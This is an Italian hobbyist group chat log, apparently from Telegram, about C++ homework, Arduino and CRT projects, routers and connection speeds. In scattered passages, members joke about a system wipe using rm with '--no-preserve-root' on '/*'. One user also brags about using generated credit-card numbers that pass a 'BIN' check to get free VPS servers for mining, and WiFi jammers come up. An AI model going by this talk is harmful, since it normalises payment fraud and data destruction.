Python è ottimo ovunque non ci sia necessità di prestazioni elevate, altrimenti ripiega su c++ o rust
c++ è tipo uccidersi
Nah
 ciao, potresti aiutarmi nella creazione di un file il C++
ok, dammi solo un po' di tempo che sto lavorando a una cosa
vai di python
 per importare la libreria per l'io di file
poi per scrivere su file basta usare queste righe:

ee tutto ciò per scrivere "variabile" dentro il file, era questo che doveva fare?
Nel senso uno script
no, tutto questo per scrivere su un file il contenuto della variabile "variabile"
appunto, pure io l'avevo intesa così
Perché il Sonof non mi crea final stage il Sonof
si...cos'ho detto
vabb, intendevo quello
ah, avevo inteso "scrivere 'variabile' su un file"
io sto tentando di installare tvout sull'ide di arduino, è una tragedia
sisi, intendevo la variabile "variabile"
Programma che legge un serie di numeri da tastiera e quando viene inserito lo 0 indica il maggiore e il minore tra i numeri inseriti
ok...però devi inviare un invio ogni volta che inserisci un numero
nel senso che vuoi sapere come creare un programma in c++?
Si con questa traccia
ora...per farlo io userei i vettori, credo sia il miglior e più pulito modo
è un compito per casa o cosa questo?
Sarà almeno 2 settimane 
Comandi vocali in italianoooo 
Un compito di sicuro
Vi faccio una domanda: secondo voi, considerando che la velocità del 4g non mi serve, risparmierei batteria andando solo in 3g?
si
Ok allora mi tengo il mio amato h+. Per quanto riguarda invece le radiazioni dannose cambia qualcosa da 3g a 4g?
Compiti per casa
apposct, puoi usare i vettori oppure no? se non puoi allora devi far inserire il numero di valori che gli dai
Si con il numero dei valori che gli dai
beh basta che lo fai inserire, fai un for(int i=0;i<n;i++) dove "n" è il numero di numeri, e poi dentro fai inserire li i numeri e fai if(numero>max && numero !=0) e poi if(numero==0) break; anche se non ha molto senso inserire lo 0 alla fine se sai già quanti numeri sono
Io l’ho fatto cosi
int 0 non vuol dire niente
Oltre a quello cosa devo modificare
Anche io ti direi così che il for è fuori dal blocco principale
i due cout vanno fuori dal ciclo, nell'if ci metti un max=num; e poi fai un altro if(num<min){min=num;}
quanti numeri devi controllare?
e poi ti sei perso una graffa prima del for
Quanti ne voglio
ok

allora ti arriva la pappa pronta
lìho fatto io a scuola
attento a chiudere il main proprio
scherzavo, non l'ho salvato sulla usb
Si, ma non è per me
Dicono tutti così
Ti giuro
Anche io ho usato questa tattica quando sono andata in farmacia a prendere il test di gravidanza
Ma questa è la verità
Non Cosimo voleva dire gruppo
Ma che scuola fa?
Ma chi è, Roxy?
Digli che dev-cpp è monnezza
scusate perchè se apro il terminale su ubuntu live mi si blocca tutto?
Date una medaglia a questa donna
Purtroppo in alcune scuole ti obbligano ad utilizzarlo
Aancora un po' di lavoro e dovrei farcela
Mi dovrebbe servire solo una resistenza da 1Kohm e una da 480 ohm e poi ci sono
Io ho il negozio in paese
che roba è?
ragazzi qualcuno ha esperienze con la comunicazione i2c?
un crt connesso ad un arduino leonardo pro micro
che roba è un crt?
un tubo catodico
ah capito
Nooh
Diglielo in faccia
I siti fatti bene
Bada a fare il nostro 

Minimale
Certo
Un H1, 2 H3, e 5 P
Tutto con Jinja Template Blocks 
Certo
 è un ladro, mi ha rubato la bio.
mah....
la ho da un casino di tempo
ma poi come conosci la mia bio? mi stalkeri?
Io da più di te 
No, stavo cercando una persona sui membri e ti ho aperto per sbaglio
vabbeh

Ora faccio concorrenza a 
 
roba da anziani 
è roba bella, non da anziani
roba divertente
grazie per il conforto 
perchè dovrebbe essere da vecchi, te lo dico io che ho 16 anni
Avete qualche sfondo bellino per cellulare? Possibilmente qualcosa che centra con la programmazione
Raga sono io mi aiutate?
Mmm
No
Grey 900 eh
Non ho capito *yotobi gif*
È un amplificatore differenziale
-_-

Qualcuno sa un po' di assembly?
Un po', ma mi fa alquanto schifo
L'ho dovuto studiare a scuola
Un po', ma ogni architettura di processore ha un suo set di istruzioni
Io a scuola ho studiato quello dell' 8086
Ah ok. Grazie Google
I know MIIPS32?
Il mips lo dovrei studiare entro giugno ma non ho ancora cominciato 
Una domanda, quante cose dovrei aggiungere per fare un calcolatore a 8bit con un z80?
Perche so che non ha periferiche tipo rom
Neanche il clock
Grazie mi hai ricordato che devo studiare...
tra poco arriva il cabinato 
cosa ca...?
RESPONSIVE
Pff, non hai speranze 
(sesta collab? )
edit: ah ma era una playlist lol
Mi credi se ti dico che le conosco tutte a memoria?  moolto figa comunque (vabeh era ovvio)

Hai scordato il --no-preserve-root
Infatti ti ha spammato un sacco di not permitted
Giust
Ti sei dimenticato --no-preserve-root

I'm sad
Ha messo /*
È il mio tessorroooo
Certo, gli servono ancora 2 resistenze per far funzionare il tutto ma hey, voglio attaccarci il rasp e fare super mario io ._.
Eh, ma la cartella "root" se non metti l'argomento non la cancella
approposito di raspi... oggi flasho opencv, se non va lo lancio dalla finestra
Bravo bravo
Se ti servo come supporto morale ci sono..sto a casa con raffreddore e febbre :D
Se non funziona:

mi sono divertito troppo sto weekend
ho dovuto cambiare 5 sistemi operativi, ogni volta prima di farlo mi divertivo a distruggerli in un modo sempre diverso 
Raga ora chi puo convertire un numero binario a dec?
Ahahahahah
Io why?
Ti mando una cosa in mp
Non puoi cercare un convertitore su google?
Ok
Let me 
 that for you:
 

ma ci sono un sacco di app e siti 
Sto a scuola
Alle 7 sei già a scuola?! PAZZO
Alle 9
Cos? ...ok
Dove vivi?
  il lunedì iniziato cosí e il top
Armenia
Tu sei un grande!
E studi italiano da autodidatta?
Credo di si in realta ho imparato qualce parola con i cartoni quando ero piccolo,poi ho trovato una community di un gioco ed ora scrivo meglio che prima .-.
Nice
Gj!
Ggggggggggggggggggggg
yay
Dai raga i classi nel c++ sono belli non vedo l'ora di studiarli .-.
Ciao, ma 
 nel video dove scompattava la img  di raspbian su arch, che ambiente Desktop usava??
Che cambia?
Che non gli importa di estrarre ma di provare quel de
Aaaah se non sbaglio usava gnome
OK grazie mille
OK ma quale GNOME?
Gnome shell
Ma sto andando a memoria, potrei sbagliarmi...
Il video è questo?
Se provi quel comando in vm, nonostante gli errori, vedrai che ti ha brasato tutto
*Il lunedì inziato con la gita a Roma è il top
OK grazie :D
Hey sembra andare..dai..solo ancora un po' di lavoro con le frequenze
Dove hanno fatto l'ultima Robocap? 
Sta mattina qualcuno mi suona al citofono e mi dice POSTINO POSTINO SCENDA SCENDA
Mi ha svegliato
 Banggood suona la mattina presto 
Quest'anno a Trento
A me non suona 
Troppi pacchi

Io sono strasfigato con le spedizioni cinesi
Idem
Cioè il trasformatore blitzwolf ci ha messo 4 mesi
Ah
Io prendo la posta prioritaria
Anche io
E arriva dopo pochi giorni
5-8

Questi li ho ordinati martedì scorso

Yep
Ma io con le spedizioni sono strasfigato in generale
Ok. 
Ho comprato delle magliette Dall'America.... Ho pagato 20 euro di magliette e 25 euro di dazi... Quando me l'hanno consegnata gli ho dovuto dare altri 25 euro non so perchè

Cooosa
Saranno stati i dazi, se te li hanno fatti pagare doppi digli qualcosa
Eh si
Non ho voglia
*li
A 
 non li fanno pagare.... usa piu banggood che il computer fra poco....
Esatto
Volevo scriverlo io ma mi sembrava troppo stronza come cosa ahhaha

Zorry ma volevo scrivere un’altra cosa

NodeMCU in offerta
Quasi quasi ne prendo una decina
La prima va bene?
si. arriva in 15 giorni in questo momento
Basta che non mi sparano 40€ di dogana
dipende quanta roba hai preso, ma non credo :)
Penso di prenderne 5-10
non dovresti aver problemi. semmai c'è l'assicurazione dogana aggiuntiva se ti serve
Ottimo
Guarda "5 C++ / SFML programs" su YouTube

 questo è per te
È bravo bravo questo
maaa, sta giocando a the powder toy
almeno fino ad un certo punto, la parte dopo è una figata
Si e se vedi il suo canale c'è di meglio
Belloooooo 
Lo so
Una foto di Giulian 
leggi nel tubo catodico piuttosto
HAHAHAHAHAAHAHAHHAHAAHAHHAHA
Ho preso un mouse da gaming wireless da gearbest a 3 euro circa. È affidabile?
Quale?
Trovato un prodotto interessante su Gearbest:HXSJ X20 Optical Game Mouse 
Guarda uno degli ultimi video di blink in cui confronta mouse di fasce di prezzo diverse
Ok
Non te lo aspettare da gaming 
Ma a 3 euro non vedo perché no
Spero di non avere un tumore alla mano se lo uso
Ma no 
Ciao qualcuno usa octopi con raspian ?
Visto il prezzo avrà uno di quei sensori che come lo muovi velocemente va ovunque tranne che nella direzione dove lo vuoi mandare
Un mio amico ha un mouse che come lo muove velocemente il sensore smette di rilevare movimenti a caso
Esatto
Quando sbagli resistenza
peró Trump c'è
si ma io sto provando a sintonizzare trump con 2 potenziometri da 100K tentando di beccare 480 ohm e 1kohm, è impossibile
è una challenge questa
Ma è bellissimo
aspetta di vedere quando riesco a sintonizzarlo
Senza tester?
ce l'ho qua a fianco, ma tanto non serve, lo vedi ad occhio se la hai beccata o no, se non la becchi succede che si distorce tutto oppure si moltiplica l'immagine
Ma prova direttamente col tester 
Così sei sicuro che va
ci ho già provato, è la stessa cosa, è impossibile beccare esattamente quella resistenza
:<
Oggi a Roma
ma se metti delle resistenze invece che dei potenziometri?
non le ho in casa
quando le avrò metterò quelle
manuali di python e c++ da consigliarmi da amazon?...devo usare i soldi di renzi in cultura...
asp per quello di py
lo devo ritrovare

Allora c'è questo:


Che ti spiega oltre al linguaggio anche alcune cose pratiche, per esempio utilizzo di librerie quali twilio, requests, o smtp
Altrimenti se vuoi solo la teoria:


i primi 2 gli ho letti io personalmente
il 3o mi hanno detto che è ottimo per quello che tratta, anche se non l'ho letto in prima persona
ok perfetto grazie
di niente ;)
il terzo lo avevo gia nel carrello
gg allora
ehm
il nome 
non so se gli va bene al regolamento
cambio
boh
chiedi a qualche admin
fa niente
k
sapete come calcolare la costante di tempo di un condensatore avendo solo la C?
Ho fatto delle ricerche non è lo stesso ambiente desktop
Ah, io non so nulla, in elettronica sono un nabbetto
per la costante di tempo ti serve una resistenza...circuiito RC
f e m sarebbe forza elettromotrice
hai t1 e v1 ...quidi puoi asp
I i condensatori
The audacity...



by 
 mi potresti aiutare?
^^
SI PUO INOLTRARE DA PROGRAMMER HUMOR???
WTF
l'ho abilitato, se era in whitelist programmerjokes, why not programmerhumor?
YAYYYYYY


No – 28
 67%

Si – 14
 33%

 42 people voted so far.
Random Sondaggio
scusa ma non ne vedo l'utilità di usarlo come principale
è per curiosità
no sisi
è la mia opinione sull'usarlo
ora lo mando su altri gruppi e vedo che rispondono 
tanto credo che potete vederle anche qua
le loro risposte
ehehehe
No gif come mai?
ahahahah
UN tutorial per configurare la cam su Octoprint?
perchè sennò inizia lo spam
Non riesco a settare un miner porca porchetta
oh non mi offendere la porchetta eh

Raga ma la distanza da cui prende il wifi dipende dal router?
Oppure c'è un range fisso
Ex. Dopo 40m non prende più il wifi
dipende dal router
ieri avevamo discusso su un antenna
ovviamente dipende
Dio povero
con questa antenna non avrai problemi di wifi in 20km
ahah 
cioè, in pratica monta il router su un ripetitore
o meglio questa meno costosa
fottuto genio questo
piano 
Buono buono
io con tim ho 99mbs fissi
Questa è la Tim a Trento almeno un paio di volte al giorno
in down
Anche a me succede, specialmente guardando youtube, ma ricaricando la pagina 1 o 2 volte si sistema tutto
Questa è la Tim a Trento almeno un paio di volte al giorno
E sono di trento
Fibra 100mpbs dicevano...
E mi da anche noia quel 60Mb
Voglio la 100 piena
Gne gne gne
Io ho ancora il doppino telefonico che mi porta la connessione in casa
Ritieniti fortunato
Ahaha
E' tutto relativo
4.5mbps in download a 0.40 in upload
Però ho solo 60 di ping
mi ricorda qualcosa
Nel migliore dei casi
La tua connessione negli anni 90?
negli 2 anni fa
A me da poco hanno messo la fibra, 27 down 2,5up (30mb) prima mi ritrovavo 3 e 0,2
Solo?
E a te come va?
siamo li
Escila

ieeeeeee
Telecom starter pack
Ma che è sta roba
nella mia zona telecom è il migliore, vodafone ti muore letteralmente la linea almeno tipo 4 volte al giorno e tutte le altre sono più lente, telecom is the best qua, anche se vabb...vivendo in provincia di vicenza che ci vuoi fare
Fibra 100mpbs dicevano...
da notare che c'è più ipload che download

Da me prende solo la 7mb e ovviamente va a 3 mb...
lol
Quello anche da me, delle volte mi va 20/ 30 up
 anche da me è così, tutto il giorno....... il problema è che l'upload è 500 kbps
 pivellino
Fibra 100mpbs dicevano...
e la telecom mi garantisce 20 mbps in download e 10 mbps in upload
La tim...tutti i giorni
qualcuno che mi capisce
Ma cosa è
C'è qualche dispositivo che fa interferenza con il Bluetooth? C'è un tipo che rompe con la cassa in bus...
ragazzi, sapete se esiste un filtro antipolvere per il masterbox lite 5
?
Si questo:
questo fa veramenteee taaaaaantaa interferenza
penso di si comunque vendono quelli universali e te lo tagli su misura

ok, grazie
 in effetti... potrebbe essere quel che cerco
Si però costano centinaia di euro
i jammer
Mmm... ok non ne vale la pena...
Quelli per il WiFi in locale te le cavi con 10€
con un esp8266
anche a meno
Fibra 100mpbs dicevano...
e non solo in locale
sempre meglio di quando Fastweb va a 50kbps
hai un ping altissimo 
3,50€ su banggood
c'è di peggio
mi lamento del mio ma va a 50ms
pure io mi lamenterei con quel ping...
però ho convissuto con ping peggiori
 , tu che tutto vedi e tutto puoi, puoi consigliarmi un buon raffreddamento a liquido all in one per cpu a meno di 80€?
Comunque a me Speedtest da valori più bassi della velocità con cui Steam scarica i giochi 🤔
io avevo visto questo: 
Quello dipende dal server che prende speedtest
il più vicino
che mi pinga 5ms
poco
non mi lamento
Ma non è detto che riesca a farti scaricare a piena banda
un mio ex amico pingava 1
Aveva il server in garage
FTTH
Te non lo hai?
più che altro finisce lo Speedtest non si è ancora stabilizzato, continua a salire...
no
VDSL2
Io no, ho la fibra a 50 metri da casa
Poi passa al ramr
pure io
Anche se liperfibra mi arriva fino in casa
Però non la ho
vai a convincere il condominio
Non ho l'abbonamento io c'è dentro casa
ma che ci fanno i terzi col mio IP?
Non la ha tim, la ha fastweb
Io mi accontento di questa mia alla fine...
però sto download non si scolla da 90
Va beh mica va male
su Steam mi scarica a 100 precisi
A me basterebbe anche 20
beh vedo la centrale Telecom dalla finestra
Ma non sei su Fastweb?
e ho Fastweb
coerency
l'ultimo miglio è di Telecom
"infatti per questo motivo non posso cambiare router" (parole di Fastweb)
coerency v2.0
Ah ok ci sta
Odio quel router tim che mi fanno pagare... Dopo 10 metri perde il segnale
io ho quello di Fastweb che è peggio
non ci si connette il Sonoff
ho comprato un Fritz!Box ma non posso usarlo come modem, solo come router, quindi diverse feature (MyFritz, Fritz!NAS, IPv6) non posso usarle
Io ho 2 range extender xiaomi messi accanto al router e mi fanno tutta casa
Pagati in totale 5€
Almeno la parte router sarà stabile
perché 2?
minchia
Perché uno è al piano terra uno al primo piano
Fritz va meglio di Netgear e ho detto tutto.
ah avevi detto che erano entrambi accanto al router...
Uno è nella stanza accanto e l'altro nella stanza subito sotto...
ah
prova a metterne uno vicino al router, usarlo come AP e disabilitare il Wi-Fi dal router.
secondo me ti va meglio il Wi-Fi
Come, si connette al WiFi del router e la riduplica con stessa pw e ssid
si può settare come AP?
di solito possono essere usati sia come access point che come range extender.
Col Wi-Fi del router di Fastweb facevo 15Mbps se va bene, e si disconnetteva da solo in continuazione.
Non credo, poi non ha il wifi a 5ghz, io mi connetto a quello
ah
Costa 5€  e dato che non è arrivato per 4 mesi me ne hanno mandato un altro gratis, non posso pretendere che abbiano molte funzioni
rip
Però è triste che abbia l'antenna più potente del router... Prima avevo un asus che faceva tranquillamente tutta casa...
con 20€ in più c'erano quelli della TP-Link che hanno anche i 5Ghz e possono funzionare sia da range extender, sia da AP (Ethernet to Wi-Fi) che da Wi-Fi to Ethernet.
Ma la robocup quando si fa ?
è finita (?)
Ah grazie
non lo so, so solo che c'è stata sabato, poi non so come funziona
non mi sono mai informato perché non ho mai avuto voglia di costruire fregni che camminano a 2km/h e seguono una linea
Va beh, ma va abbastanza bene così... Non ho grossi problemi
Grazie
Magari ti divertivi
C'era la robocup 2018 al tg1 poco fa

Uuuj
  
Cissà quali str... stupidaggini avranno detto come è solito fare il tg quando si parla di tecnologia
Per questo ho chiesto perché mi è venuto in mente
Come giusto che sia, il wifi 5GHz non è legale in italia
Come no

Dai se chiudete la serie web, aprire la serie robot fai da te
Raga c'è un modo per aprire per esempio google e cercare qualcosa con un programma di c++
stack overflow is the way
 {variabili}
Qualcuno di voi controllore alla metro?
Se faccio il trenino e ho il birg timbrato sono sanzionabile?
Oggi ho fatto il trenino dietro un amico e mi ha fermato il controllore
Hai preso multa?
E perché? Io il biglietto l'ho pagato ed è stato obliterato meno di 24h fa
Però vorrei chiedere a uno "esperto" se posso farlo o meno
Credo di si anche perché se il biglietto lo passo la porta si apre e quindi è valido
La hai presa o no la multa?
No
E allora non porti domande xD, probabilmente se voleva qualcosa poteva farti
Il FastGate?
Io non l'avevo visto e mi so è avvicinato sto tipo vestito normale che mi dice "c'è l'hai il biglietto?" Io glielo caccio e lo vede e mi chiede perche non l'ho passato e li ho detto che non avevo voglia di prenderlo e andavo di fretta e mi ha lasciato libero
ragazzi ho un problema con una funzione ricorsiva in c++, è di 5 righe, la posto con pastebin?
naah se è di 5 righe copiaincolla pure

In pratica questa funzione deve sommare le cifre di un intero ma non va, mi va in loop infinito. Come mai?
è perchè hai due return? non so molto di cpp, quindi boh
Macché, quello del 2013 se va bene
mmmhh
ok risolto, errore stupido mio
era quello? 
Ora me ne sono accorto: la funzione funziona benissimo, l'errore era nell'istruzione precedente la chiamata.
Bm?
Huhu
Da dove hai iniziato?
Minchia che velocità
Dal basso o dall'alto?
basso basso
Sai se il FastGate va bene per i Sonoff o danno problemi?
Parto dall'alto e ci troviamo a metà?
ok 
Un alieno
Volete una mano?
Ah no niente non posso 

Mi sa che abbiamo finito
Avessi potuto avrei dato veramente una mano a bannare tutti quei bot
Pulizia fatta, torno a dormire 
mi sa di no
?
ho appena controllato tutto, sono entrati 16 bot e ne sono stati bannati 16
ma li vedo tutti e 16 nel gruppo wtf
Mi sono perso una shitstorm?
anche io tranquillo
stavo su Fortnite
male
non giocavi a Fortnite tu?
pochissimissimo
io ci ho iniziato a giocare perché ci giocano tutti i miei amici
ma faccio abbastanza pena
sia con l'aim che con le build
Io non ho questo problema
Non gioco>>>
poi per qualche motivo non ne vuole sapere di girare bene sul mio PC (i5 6600k al 70% e la 480 al 100%)
120 FPS con tutto al massimo tranne le ombre e 60 con tutto al massimo
laggoso per uno abituato a farne 300/400, più che altro per i framedrop e per l'input lag
 
Era sottointeso
comunque sono riuscito a corto circuitare un jack 3.5mm solo e solo per riuscire a far uscire il segnale rca dal rpi, ora uso come monitor questo crt 120x96 in bianco e nero :DDD
Dopo questa non so se collaborerò ancora per Switchando
ma
vi sta così sul cazzo quel gioco?
Che sfiga di merda.... Si è rotto grub
 preparati al prossimo progetto da esporre a scuola, qua altro che 
, qua è finita
A me si, ma è un problema mio
a me sta sul cazzo FIFA
sono gusti
a me non piace ebbasta, l'ho provato e non mi piace, non che sia brutto, solo che non essendo bono ti sterminano i primi 5 secondi di gioco e sono minuti di attesa per iniziare una partita
A chi non sta sul cazzo fifa ?
Fulminati prima, che altrimenti arrivi a 20 dieci in informatica
capisci che ora ho appena acceso il saldatore, c'ho i miei che stanno prendendo le mazze ferrate probabilmente
pensavo a qualcosa con retropie e un joypad fatto con l'arduino tipo
*e scarti dei vecchi joypad della 360*
Fai il bravo e cita il video di romboli, altrimenti qui la mano s'incazza

va bene se invece che dire essenzialmente mi metto a dire sempre cose varie?
Romboli ti denunzia
Anche a me, ma ripensandoci meno di Fortnite
Mi spiace
Finisci in tribunale e perderai la causa perché il giudice s'è stufato degli essenzialmente
Salve a tutti! A qualcuno interessa???
Non da acquistare ma da costruire
Ragà, ho "riparato" grub con boot-repair Ed è venuto fuori questo
Regge fino a dal di 700gr
Però prima mi ha detto questo
Dslr
Entra con live usb e aggiorna grub
Inutile sto casino per una action cam
Ok, maglio, ma costerà quanto comprarlo senza averne le funzioni
Ok sono entrato con una live...ora ?
Che live?
Una live USB
Si ma che os
 ma l'alimentatore bè quiet che mi hai consigliato non ha la presa it
Ho boot repair
ma quella uk
perché tutto quello che devi fare è "aggiornare grub", su manjaro non ricordo tutta la procedura ma in ogni caso con google trovi
K grazie
Io ho una Sony a6300


Android – 45
 80%

Iphone – 7
 13%

Windows – 4
 7%

 56 people voted so far. 

Solitamente la monto qui
Se qualcuno vota iPhone lo banno
Volevo creare un app (per un sistema più usato) e capire gli utenti su che sistemi sono principalmente indirizzati. Grz
Anche se non ho i permessi
Ma piuttosto..windows? Seriamente?
chi sa se 
 vorrebbe fissare il messaggio... grz
Ma non è cosa grave possedere un iPhone
meglio di Ios
è un reato
Da certi punti di vista per chi lo usa è perfetto
Se è l'x si
quello è da condanna a morte 
A una che non sa manco accenderlo non puoi dare uno xiaomi con Rom cinese
io con il mio mi max 2 mi trovo benissimo ed è semplicissimo
Spero ci tiri su una mirrorless
Per alcune cose non è intuitivo
sapevo che si sarebbero scatenate guerre profonde 
Esatto non puoi, devi 
Si
Come faccio a fare questo?
VOTATE IL SONDAGGIO GRZ

È come dire Linux o Windows
Per una persona che non sa manco accenderlo non gli puoi dare una distro in cui si deve installare manualmente i driver
Aka partire con arch quando tutto quello che sai su linux è "è un sistema operativo"
🤔sicuro?mi sembra strano..vabbè che basta cambiare cavo, con 5€ risolvi
Posso dire che non ne ho idea?
ok
ma il cavo posso trovarlo a un comune negozio di elettronica?
o cose simili
o devo prenderlo per forza da Amazon?
perchè nelle recensioni un tizio dice che ha la presa UK e nelle domande dicono italiana
certo che lo trovi..anche al Mediaworld lo trovi volendo
ok
se è venduto in Italia avrà al 100% presa IT..sicuramente è una recensione inglese
ok
Che poi sia interessante, utile etc... È un conto
Però se manco trovi un wiki che ti dice come fare con le tue stesse specifiche ciaone
HAHAHAAHAHAHAHAHAHAHA
comunque grazie per la disponibilità, se non fosse stato per te a quest'ora stavo con una bomba al posto dell'alimentatore
io è da 5 giorni che non riesco ad avviare Windows 
+1
rip
Fuck
Mmm comodo
Raga, ho tutte le vps che voglio ma non so cosa farci
Hai preso a calci l'hd?
Appena scade la cosa mensile poi mi tornano in mente le cose che volevo fare
non taggarlo per niente... non lo fissa 
Io Windows lo potrei anche avviare... Il Mio problema è Linux
Ed ho anche la partizione criptata
mining... sempre qualcosa in più se hai tanta potenza di calcolo
Ci ho pensato ma poi bloccano l'account
Ne dai una a me
tutto il resto dei progetti che puoi fare con una vps non ha senso farli per poco tempo
eh niente allora 
Mananggia
le hai comprate senza avere un'idea fissa?
Guarda, io per le vps non ho mai speso un soldo
Diciamo che ho trovato un bug
immaginavo 
figurati, per così poco
che hosting? 1and1?
free trial?
Nono
In pratica uso il bug dei bin
Sono carte di credito (generate, non reali) e i primi 6 numeri (bin) diciamo che sono buggati
carding quindi
Nono
Carding è quando usi carte reali
Queste sono generate, ma che il sito le valida
figo
Non so bene come funziona, però và
l'os puoi sceglierlo tu?
Tempo fa su IBM avevo bin mi sono fatto 80€ di mining
Yep
  ufficiale da oggi!
ok, ma non puoi rinnovarle di mese in mese?
Per ora ho quest
xiaomi in italiaaaa
così ci metti su un sito
o un gameserver
Lo stavo facendo con WordPress ma poi bho
giàufficiale
Ti sfido bitch
Che spettacolo!


 i referral non sono ammessi in questo gruppo
Elimino il messaggio.
 non so se si warna in questo caso, in caso warnate voi che non ho i poteri io.
 🤔questo è un tantinello preoccupante
Ma prendetevi un VPS scarso e metteteci OpenVPN che vi passa la paura
Se proprio vi serve una VPN...
la cosa che mi meraviglia è il fatto che non ci sia la VPN di Opera nell'elenco
No warn ma hai fatto bene a eliminare 
Io mi preoccuperei di queste notizie del cazzo
il regolamento dice ban, di solito warniamo
.-.
Se ci riesci a mettere su le mani 
... 
Solo us
Comunque basterebbe il phat, poi il resto è easy

È disponibile su un sito... Magari spediscono
Solo us
Mm
buongiorno mondo
avevi fatto tu un video su come prendere le robe dall'America
Appunto 
HAHAHAHAHAHAHHAHAHAHA
Hai anche ragione
Resta il fatto però che sono 50$ per un raspberry pi zero più 7$ di cazzatine
aiutare Marco con un video di Marco: fatto
Beh non sono proprio cazzatine
Quello speaker costa $1.65 su banggood
Il cartone e i fili sono gratis
La phat sarà 40cents di materiali... più di 7-8$ non mi aspetto che costi
Quando entri alla Wind x cambiare tariffa ed esci con un Google Home Mini 
Che prezzo fanno?
Gratis 
Cos
Se resti con wind 30 mesi
Ok corro
Corri corri
Sisi dovrei avere ancora un paio di premi
Ahahaahah io sono già Wind 
Tutta la mia famiglia è Wind tranne me
Vai 
 Marco che mi serve che implementiamo tutta la domotica con Google Home Mini 
Pensi che riusciamo ad integrare i Sonoff con Sonota su Google Home Mini ?
Magari con Rasp da tramite ?
Già lo amo
La prossima sfida è guardarci un Hentai
fa tutto effettp vintage, il bello che la foto non è sfocata, è proprio sfocato di suo
Te lo danno come ricompensa visto che devi soffrire usando Wind
E poi c'è la Vodafone che continua a rompere per offerte fantastiche che però costano troppo per me
Vero?
Chi glieli paga tutti sti soldi
Da dove comincio?🤔
10,8€
Perché ,8
Perché erano 10€ ogni 4 settimane
Eh ma Gesù Cristo
Anche per i nuovi clienti no
Sì per tutti
Hanno aumentato tutti gli operatori
Esosi viscidi
Prima Amazon prime
E dopo questa 
Sugli operatori telefonici non dico niente, vogliono sempre troppo. Ma Amazon prime anche dopo l'aumento non costa tanto considerando quello che offre
Ovvio che se prendi una cosa ogni 6 mesi non ha senso farlo, ma se compri tanto conviene
Per prime video...
Comunque sto esagerando
Bah
Se hai soldi da spendere fallo 
Ecco
Il problema è che non ce li ho
Quest'anno ho già finito due volte la PostePay
Per la serie 
.. WiFi ad unitn
bella la simmetria
Il wifi unitnx e unitn sono perennemente intasato, perquesto è cosí lento... Non per nulla la lan va oltre i 900Mb/s simmetrici
si ma...si ma....ma...a me basta questa velocità sinceramente
sono messo 25 volte peggio qua
L'uni ha la 10Gb/s simmetrici, io a casa ho la 7Mb/s...
same
Eh già
Ma per un WiFi con connesso mezzo mondo non è male
Già
che fai sfotti? io me li posso sognare quei picchi
Immagino, su uno schermo così ahaha
Giulian tu si che mi capisci
mahonna, 1Mib di download e in upload linea piatta
io 9-10 down/0.8 up
ecc, capisci che qua siamo più isolati di quanto non faccia a trento
“100 Mega”
Quando non hai niente ds fare nel laboratorio di elettronica
Progettino per Natale prossimo
Ha pure i giochi di luce, facendo falso contatto genera un tremolio a prova di albero di Natale
Poveri reofori
prova unendo negativo e positivo
è quando vedi quest'ingiustizia nel mondo che ti sale un San Pietro feroce con gli Apostoli a rimorchio
Troppo lenta per i miei gusti
ecco, io vivo affianco alla città di san pietro :D
Realacci sei da
Vedi l'amperometro dell'alimentatore impazzire
letteralmente
facciamo cambio? ti do la mia ADSL
Ho bisogno di un consiglio
Coolermaster mi regala il PSU solo se accetto anche un case
Pensa che carico 24h/24
Ma io ho il mio h700i
io non lo vorrei neanche regalato un loro alimentatore
 l'alimentatore non l'hai già preso?
Guardati i video di Falco 75 se devi scegliere un alimentatore
Tranne i vxxxxxs, quelli sono buoni
si ma per quanto costano ti ci prendi un Seasonic, un EVGA, un SuperFlower diamine!
Cos
Ayayayaya
Vorrei abitare anche io a Chicago
Alla fine so come sfruttare i metal server
quando fai ispeziona elemento e metti a sommare i valori ogni secondo
Faccio un bel host minecraft
No vabbee
Ma tu eri quello della VPS di Windows che doveva mettere wamp
MUAHAHAHHA
ma infatti è su vps con quello speedtest 
Si ma di PSU hanno quelli buoni... il problema è
"Bello rgb comprando un PSU su amazon" o "roba gratis e l'nzxt lo rivendo"?
Ma è partito il momento di condivisione degli speedtest?
dipende da quale case e alimentatore ti regalerebbero..perchè se ti danno un MasterWatt Lite tiraglielo in testa
circa
IO CE L'HO PIù GROSSO!
(Il download)
rip
Era ultimora :c
anche se la mano è in ritardo stavolta 🤔
E questa è Wind che in 4G+ va a velocità H+
Correggo: Server Dedicato
.-.
 fammi sapere che case e alimentatore ti propongono
Il mio LTE
cos'è sta iperbole mancata
tvb
lol dissing


 ‎€4‎.9‎9 ‎in‎ve‎ce‎ c‎he‎ €‎17‎.99
⚖️‎ R‎is‎pa‎rm‎i ‎il‎ 7‎2.‎26%
⭐️‎ 4‎.4‎0 ‌‎/‌‎ ‎5.‎00‎ (‎29‎ r‎ec‎en‎si‎on‎i)
✂ 
: 

 

 non funziona, o meglio...lo sconto che viene applicato è di 9 euri più spedizione di 4
A cosa servono così tanti diodi con valori diversi.. se almeno fossero zener...

 ‎€7‎.6‎4 ‎in‎ve‎ce‎ c‎he‎ €‎9.‎99
⚖️‎ R‎is‎pa‎rm‎i ‎il‎ 2‎3.‎52%
⭐️‎ 5‎.0‎0 ‌‎/‌‎ ‎5.‎00‎ (‎1 ‎re‎ce‎ns‎io‎ni)
 

Ragazzi ma esiste un modo per avere altri pin SDA ed SCL su un Arduino?
Non credo
Sono pin interni al microcontrollore...
Non avrei molta voglia proprio di usare 3 Arduini per utilizzare 3 sensori a tempo di volo
Quel bus non usa indirizzi?
Vabbè non hanno indirizzi diversi?
Credo che tu possa mettergli tutti in parallelo...pero non sono certo...
Con I2C puoi avere più sensori sugli stessi pin bisogna solo cambiare indirizzo
E come bisogna fare?
Detta in due parole
Teoricamente sul PCB ci sono due piccole piattaforme ricoperte di rame, se sono saldate insieme il sensore avrà un indirizzo altrimenti ne avrà un altro
La PCB di Arduino intendi?
No il sensore
A trovale per 3 valori...
Oppure esistono i multiplexer
Si ma non mi riconosce da quale sensore mi rileva la distanza
O no?
Mmm anche con dei transistor
Gli manda in Alta impedenza
Stessa cosa per un raspberry? Ha solo un connettore SDA e un SCL?
dovrebbe averne 3
però occhio che lavorano a 3.3V e non a 5V
Si sì in teoria (devo informarmi bene) quei sensori lavorano a 3.3V
Il sensore che legge è quello selezionato
Basta multiplexerr argg
Oppure alimenti tramite I/O solo il sensore che ti serve in quel momento
Figata
Ottimo, sarebbe perfetto
FUNZIONA TUTTOOO
🤔non saprei..forse è scaduto il coupon oppure hanno finito i pezzi
